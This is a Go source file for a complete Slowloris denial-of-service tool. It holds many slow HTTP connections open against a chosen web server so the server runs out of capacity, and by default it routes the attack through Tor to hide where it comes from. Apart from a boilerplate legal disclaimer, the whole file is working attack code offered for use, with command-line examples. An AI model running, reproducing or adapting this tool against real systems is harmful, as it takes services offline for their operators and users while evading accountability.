package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"time"

	"golang.org/x/net/proxy"
)

const (
	defaultTarget             = ""
	defaultNumConnections     = 500
	defaultAttackOverTor      = true
	defaultInterval           = 1 * time.Second
	defaultTimeout            = 60 * time.Second
	defaultUserAgent          = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
	defaultMethod             = "GET"
	defaultHeader             = "Cookie: a=b"
	defaultResource           = "/"
	defaultUseHTTPS           = false
	defaultFinishRequestAfter = 0

	// Specify Tor proxy ip and port
	torProxy = "socks5://127.0.0.1:9050" // 9150 w/ Tor Browser

	legalDisclaimer = `Usage of this program for attacking targets without prior mutual consent is
illegal. It is the end user's responsibility to obey all applicable local,
state and federal laws. Developers assume no liability and are not
responsible for any misuse or damage caused by this program.`
)

func usage() {
	fmt.Printf("\n")
	fmt.Printf("usage: slowloris [OPTIONS]\n")
	fmt.Printf("\n")
	fmt.Printf("OPTIONS\n")
	flag.PrintDefaults()
	fmt.Printf("\n")
	fmt.Printf("EXAMPLES\n")
	fmt.Printf("\t%s -target 127.0.0.1 -connections 500\n", os.Args[0])
	fmt.Printf("\t%s -target 127.0.0.1 -connections 500 -https\n", os.Args[0])
	fmt.Printf("\n")
	fmt.Printf(legalDisclaimer)
	fmt.Printf("\n")
	fmt.Printf("\n")
}

type options struct {
	target             string
	numConnections     int
	attackOverTor      bool
	interval           time.Duration
	timeout            time.Duration
	userAgent          string
	method             string
	header             string
	resource           string
	useHTTPS           bool
	finishRequestAfter time.Duration
}

func (o *options) String() string {
	return fmt.Sprintf("================= OPTIONS =================\n"+
		"Target:                  %s\n"+
		"Number of connections:   %d\n"+
		"Attacking over Tor:      %t\n"+
		"Duraton between headers: %s\n"+
		"Connection timeout:      %s\n"+
		"User-Agent header:       %s\n"+
		"HTTP method:             %s\n"+
		"Resource to request:     %s\n"+
		"Use HTTPS:               %t\n"+
		"Header:                  %s\n"+
		"Finish request after:    %s\n\n", o.target, o.numConnections, o.attackOverTor, o.interval, o.timeout, o.userAgent, o.method, o.resource, o.useHTTPS, o.header, o.finishRequestAfter)
}

func main() {
	opts := options{}

	flag.Usage = usage
	flag.StringVar(&opts.target, "target", defaultTarget, "Target's IP")
	flag.IntVar(&opts.numConnections, "connections", defaultNumConnections, "Number of active connections")
	flag.BoolVar(&opts.attackOverTor, "usetor", defaultAttackOverTor, "Attack over Tor network")
	flag.DurationVar(&opts.interval, "interval", defaultInterval, "Duration to wait between sending headers")
	flag.DurationVar(&opts.timeout, "timeout", defaultTimeout, "HTTP connection timeout in seconds")
	flag.StringVar(&opts.userAgent, "useragent", defaultUserAgent, "User-Agent header of the request")
	flag.StringVar(&opts.method, "method", defaultMethod, "HTTP method to use")
	flag.StringVar(&opts.resource, "resource", defaultResource, "Resource to request from the server")
	flag.StringVar(&opts.header, "header", defaultHeader, "Header to send repeatedly")
	flag.BoolVar(&opts.useHTTPS, "https", defaultUseHTTPS, "Use HTTPS")
	flag.DurationVar(&opts.finishRequestAfter, "finishafter", defaultFinishRequestAfter, "Seconds to wait before finishing the request. If zero the request is never finished")
	flag.Parse()

	if opts.target == "" {
		log.Fatal("Please specify target. For more info run " + os.Args[0] + " -help")
	}

	signals := make(chan os.Signal, 1)
	signal.Notify(signals, os.Interrupt, os.Kill)

	if !strings.Contains(opts.target, ":") {
		if opts.useHTTPS {
			opts.target += ":443"
		} else {
			opts.target += ":80"
		}
	}

	// Show Options
	fmt.Printf(opts.String())

	// Attack
	fmt.Printf("==========================================\n")
	fmt.Printf("Attacking %s with %d connections\n", opts.target, opts.numConnections)
	for i := 0; i < opts.numConnections; i++ {
		go slowloris(opts)
	}

	// Attack duration timer
	started := time.Now()
	ticker := time.Tick(1 * time.Second)
loop:
	for {
		select {
		case <-signals:
			fmt.Printf("\nReceived SIGKILL, exiting...\n")
			break loop
		case <-ticker:
			dur := time.Now().Sub(started)
			fmt.Printf("Attack duration: %dh %dm %ds\r", int(dur.Hours()), int(dur.Minutes()), int(dur.Seconds()))
		}
	}

}

func slowloris(opts options) {
	var conn net.Conn
	var err error

	var timerChan <-chan time.Time
	var timer *time.Timer
	if opts.finishRequestAfter != 0 {
		timer = time.NewTimer(opts.finishRequestAfter)
		timerChan = timer.C
	}

loop:
	for {
		if conn != nil {
			conn.Close()
		}

		if opts.attackOverTor {
			conn, err = openConnectionTor(opts)
		} else {
			conn, err = openConnection(opts)
		}
		if err != nil {
			continue
		}

		if _, err = fmt.Fprintf(conn, "%s %s HTTP/1.1\r\n", opts.method, opts.resource); err != nil {
			continue
		}

		header := createHeader(opts)
		if err = header.Write(conn); err != nil {
			continue
		}

		for {
			select {
			case <-time.After(opts.interval):
				if timer != nil {
					timer.Reset(opts.finishRequestAfter)
				}
				if _, err := fmt.Fprintf(conn, "%s\r\n", opts.header); err != nil {
					continue loop
				}

			// if timerChan is nil (finishRequestAfter =< 0) the case involving it will be omitted
			case <-timerChan:
				fmt.Fprintf(conn, "\r\n")
				ioutil.ReadAll(conn) // omit return values
				conn.Close()
				continue loop
			}
		}
	}

}

func openConnection(opts options) (net.Conn, error) {
	var conn net.Conn
	var err error

	if opts.attackOverTor {
		dial := &net.Dialer{Timeout: opts.timeout}
		config := &tls.Config{InsecureSkipVerify: true}
		conn, err = tls.DialWithDialer(dial, "tcp", opts.target, config)
		if err != nil {
			return nil, err
		}
	} else {
		conn, err = net.DialTimeout("tcp", opts.target, opts.timeout)
		if err != nil {
			return nil, err
		}
	}

	return conn, nil
}

func openConnectionTor(opts options) (net.Conn, error) {
	var conn net.Conn
	var err error

	torProxyURL, err := url.Parse(torProxy)
	if err != nil {
		log.Fatal("Error parsing Tor proxy URL:", torProxy, ".", err)
		return nil, err
	}

	torDialer, err := proxy.FromURL(torProxyURL, proxy.Direct)
	if err != nil {
		log.Fatal("Error setting Tor proxy.", err)
		return nil, err
	}

	conn, err = torDialer.Dial("tcp", opts.target)
	if err != nil {
		log.Fatal(err)
		return nil, err
	}

	if !opts.useHTTPS {
		return conn, nil
	}

	tlsConfig := &tls.Config{InsecureSkipVerify: true}
	tlsConn := tls.Client(conn, tlsConfig)
	if err = tlsConn.Handshake(); err != nil {
		return nil, err
	}

	return tlsConn, nil
}

func createHeader(opts options) *http.Header {
	hdr := http.Header{}

	hdr.Add("Host", opts.target)
	hdr.Add("User-Agent", opts.userAgent)

	return &hdr
}
